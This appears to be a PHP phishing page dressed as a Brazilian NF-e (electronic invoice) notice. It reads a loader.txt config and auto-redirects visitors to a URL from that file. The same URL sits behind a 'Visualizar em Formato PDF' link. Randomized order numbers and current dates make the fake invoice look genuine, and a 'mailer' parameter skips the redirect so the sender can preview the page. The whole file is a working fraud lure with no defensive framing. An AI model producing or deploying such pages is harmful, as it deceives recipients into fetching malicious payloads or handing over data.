<?php
$config = array();
$handle = @fopen("loader.txt", "r");
while (($buffer = fgets($handle, 4096)) !== false)
	array_push($config, trim($buffer));
fclose($handle);
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1"> 
<TITLE>NOTA FISCAL</TITLE> 
<META name="GENERATOR" content="MSHTML 11.00.9600.19003">
<?php
if($config[0] == 'S' && !isset($_REQUEST['mailer'])){ echo '<META http-equiv="refresh" content="0; url='.$config[2].'">'; }
?>
</HEAD> 
<BODY>
<DIV><SPAN><STRONG>Emissao de NF-e (Nota Fiscal Eletronica)</STRONG></SPAN> 
</DIV>
<DIV><SPAN>Prezado (A)</SPAN></DIV>
<DIV></DIV>
<DIV><SPAN>Foi emitida uma NF-e (Nota Fiscal Eletronica) referente ao seu  
pedido N<?=rand(11111111111,99999999999);?>, realizado em <?=date('d/m/Y');?> as <?=date('H:i');?>&nbsp;&nbsp;</SPAN> </DIV>
<DIV></DIV>
<DIV><SPAN>NF-e Nota Fiscal Eletronica</SPAN></DIV>
<DIV></DIV>
<DIV><SPAN>Clique&nbsp;abaixo pra Consultar sua NF-e</SPAN></DIV>
<DIV><SPAN><BR></SPAN></DIV>
<UL>
  <LI><BIG><A 
  href="<?=$config[2];?>">Visualizar 
  em     Formato PDF</A></BIG></LI></UL>
<P><BIG><BR></BIG></P>
<P><BIG><BR></BIG></P>
<P><BIG><BR></BIG></P>
<P><BIG><BR></BIG></P>
<P><BIG><BR></BIG></P>
<P>
<P><BR></P>
<P><BR></P>
<P><BR></P>
<P><BR></P>
<P><BIG>Todos os Direitos Reservados - 2018 Termos de uso</BIG></P>
<P><BIG><BR></BIG></P>
<P></P></BODY></HTML>